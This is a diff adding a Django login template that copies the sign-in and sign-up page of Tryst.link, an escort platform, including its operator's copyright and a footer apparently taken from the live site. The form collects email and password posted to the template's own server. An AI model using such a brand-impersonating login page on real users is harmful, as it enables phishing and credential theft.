@@ -1,0 +1,225 @@
+{% load static %}
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <link rel="stylesheet" href="{% static 'css/style.css' %}">
+    <link rel="stylesheet" href="{% static 'css/responcive.css' %}">
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title> input_box</title>
+</head>
+<body>
+
+
+<!-- top ver pase? -->
+
+<header class="had" id="navber">
+  <div class="contaimer">
+      <div class="main">
+          <div class="image">
+              <img src="{% static 'img/logo.png' %}" alt="">
+          </div>
+          <div class="flot_right">
+              <div class="search">
+                  <ul>
+                      <i class="fa fa-search" aria-hidden="true"></i>
+                      <li><a href="login"> search</a></li>
+                  </ul>
+              </div>
+              <div class="menue">
+                  <ul>
+                      <li><a href="login"> Login</a></li>
+                      <small>or</small>
+                      <li><a href="sign_in">Sign up</a></li>
+                  </ul>
+              </div>
+          </div>
+      </div>
+  </div>
+</header>
+
+<!-- top ver pase? -->
+
+
+
+
+
+
+
+
+
+
+
+
+   
+  
+  <div class="hed">
+  <div class="login-wrapper" id="loginForm">
+
+    <form method="POST" id="my-form" class="form">
+      {% csrf_token %}
+      
+      
+      <div class="nev_logo red">
+        <div class="form_logo"><h1>Log in</h1> </div>
+      </div>
+
+
+      <div class="wrapper">
+        <div class="input-data">
+          <label class="laval1">Email address</label>
+           <input type="email" id="Name" name="name" required>
+           <div class="underline"></div>
+           
+           
+          
+        </div>
+        <div class="input-data">
+          <label class="laval1">Password</label>
+            <input type="password" class="password" id="password" name="password" required>
+       
+              
+            <div class="underline"></div>
+            
+            
+           
+         </div>
+         <div class="input-data">
+          <label class="laval1"> Please enter the characters shown inside the blue box</label>
+          <div class="capter">
+            <img src="{% static 'img/cap.png' %}" alt="">
+          </div>
+           <input type="text"  name="captur" required>
+           <div class="underline"></div>
+           <div class="chack_box">
+            <input type="checkbox"  value="1" class="form-check-input form-check-input-lg">
+            <label class=" form-check-label" > Remember me for 14 days</label>
+           </div>
+           
+           
+          
+        </div>
+     </div>
+
+
+
+
+      <div class="btn" >
+        <!-- <input disabled="disabled" onclick="window.location.href='https://www.youtube.com/'"  id="submit"   value="Login" type="button"  class="submit_btn"  > -->
+        <!-- onclick="Redirect();" -->
+        <button   id="submit" class="submit_btn" disabled = "disabled"  >Log in</button>
+        
+    </div>
+    <div class="forgate">
+      <button class="forg">Forgot your password?</button><br>
+      <button class="forg exx" >Didn't receive confirmation instructions?</button><br>
+      <button class="forg ex">I need help recovering access to my account</button>
+    </div>
+
+    
+
+    
+    </form>
+  
+  </div>
+
+
+
+
+
+
+  <div class="right">
+    <div class="nev_logo">
+      <div class="form_logo"><h1>Sign up</h1> </div>
+    </div>
+      
+      <div class="dtal"><p>Tryst.link is one of the fa
+        stest-growing escort platforms in the world. Built b
+        y the same team behind <a href="#">Switter</a>!
+        <p>Please select which type of account you'd like to sign up for:</p>
+      </div>
+
+        
+      <div class="client" >
+       
+        <button   class="submit_btn" disabled = "disabled"  >I am a provider</button> <br>
+        <button    class="submit_btn" disabled = "disabled"  >I am a client</button>
+        
+    </div>
+
+
+      
+
+        
+
+
+  </div>
+  
+</div>
+<div class="imageFild hed">
+  <div class="logoo"><img src="{% static 'img/logoo.png' %}" alt=""></div>
+  <div class="logou"><img src="{% static 'img/img2.png' %}" alt=""></div>
+  <div class="foter_list">
+    <p><span class="fa fa-location-dot fa-fw"></span> Melbourne, Australia</p>
+  </div>
+</div>
+
+<footer class="footer">
+  <div class="background">
+    <div class="list">
+      <p>© 2023 <a href="">Assembly Four</a></p>
+      <a href="">Privacy</a><br>
+      <a href="">Terms & Conditions</a><br>
+      <a href="">Support</a><br>
+      <a href="">Blog</a><br>
+      <a href="">Social</a><br>
+      <a href=""> Contact</a>
+    </div>
+    <div class="logoK_twiter">
+      <div class="twitereee">Twitter</div>
+      <div class="twit">
+        <a class="fa fa-twitter tooltip-pink tooltipstered" > </a>
+      </div>
+    </div>
+    
+  </div>
+  <div class="extra"><p>Generated at 2024-05-28T17:59:37-01:00 rev f378e6ea14</p></div>
+ 
+</footer>
+<div class="foter_menue ">
+  <div class="menmm">
+    <div class="mi"><a href=""><i class="fa fa-search" aria-hidden="true"></i> SEARCH</a></div>
+    <div class="mi"><a href=""><i class="fa fa-sign-in" aria-hidden="true"></i> LOGIN</a></div >
+    <div class="mi"><a href=""><i class="fa-solid fa-user-plus"></i> SIGN IN</a></div>
+
+  </div>
+ 
+      
+      
+      <!-- <li><a href="login"><span><i class="fa fa-search" aria-hidden="true"></i></span> SEARCH</a></li>
+      <li><a href="login"><span><i class="fa fa-sign-in" aria-hidden="true"></i></span> LOGIN</a></li>
+      <li><a href="login"><span><i class="fa-solid fa-user-plus"></i></span> SINGNIN</a></li> -->
+
+    
+</div>
+
+  <script src="https://kit.fontawesome.com/ab583dd8ee.js" crossorigin="anonymous"></script>
+  <script src="{% static 'js/script.js' %}"></script>
+  <script type="text/javascript">
+    var lastScrollTop = 0;
+        navbar = document.getElementById("navber");
+    window.addEventListener("scroll", function(){
+      var scrollTop = window.pageYOffset || document
+      .documentElement.scrollTop;
+      if (scrollTop > lastScrollTop){
+        navbar.style.top="-80px";
+      }else{
+        navbar.style.top="0px";
+      }
+      lastScrollTop = scrollTop;
+    })
+  </script>
+</body>
+</html>
